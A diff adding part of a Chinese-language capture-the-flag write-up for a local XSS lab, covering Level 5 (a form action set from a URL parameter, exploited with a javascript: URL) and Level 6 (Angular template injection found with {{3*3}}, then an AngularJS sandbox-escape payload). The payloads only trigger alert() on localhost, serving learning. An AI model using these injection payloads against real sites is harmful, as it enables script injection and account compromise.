@@ -114,3 +114,61 @@ function getQueryVariable(variable)
 要等待時間倒數完
 
 ### Level 5
+
+基本上也是直接解讀前端原始碼就有答案了
+
+原始碼 as below
+
+```JS
+if(getQueryVariable('autosubmit') !== false){
+	var autoForm = document.getElementById('autoForm');
+	autoForm.action = (getQueryVariable('action') == false) ? location.href : getQueryVariable('action');
+	autoForm.submit();
+}else{
+}
+function getQueryVariable(variable)
+{
+       var query = window.location.search.substring(1);
+       var vars = query.split("&");
+       for (var i=0;i<vars.length;i++) {
+               var pair = vars[i].split("=");
+               if(pair[0] == variable){return pair[1];}
+       }
+       return(false);
+}
+```
+
+得知只要遵循以下步驟，可以自訂 form 的 action 屬性：
+
+1. 在 URL 中加入 `autosubmit=true` 參數。
+2. 在 URL 中加入 `action=your_custom_url` 參數。
+
+此時在 action 注入 XSS 攻擊: `javascript:alert('XSS')`
+
+使用網址: `http://127.0.0.1:3000/level5?autosubmit=true&action=javascript:alert('XSS')`
+
+### Level 6
+
+到這題又沒有前端的程式碼，沒有方向下，再度用 ZAP 跑 Fuzzing。
+
+然而難過的是 Fuzzing 竟然沒有結果，至此以 CTF 的題目來說，應該不是一般的 XSS 漏洞。
+
+查看前端原始碼，看是否有線索。
+
+![alt text](image-1.png)
+
+發現是用 angular 寫的，抱著試一試的心態，利用 Angular 的 `{{ }}` 來嘗試注入 (template injection)。
+
+使用 `http://127.0.0.1:3000/level6?username={{3*3}}`，得到運算結果 `9`。
+
+![alt text](image-2.png)
+
+這表示 Angular 的 `{{ }}` 確實是會執行的，接下來嘗試 XSS 攻擊。
+
+進入別人寫的漏洞字典，一行一行嘗試。 ref: `https://gist.github.com/mccabe615/cc92daaf368c9f5e15eda371728083a3`
+
+最後在 `{{%27a%27.constructor.prototype.charAt=[].join;$eval(%27x=1}%20}%20};alert(1)//%27);}}` 得到成功結果。
+
+使用以下網址攻擊成功:
+
+`http://127.0.0.1:3000/level6?username={{%27a%27.constructor.prototype.charAt=[].join;$eval(%27x=1}%20}%20};alert(1)//%27);}}`
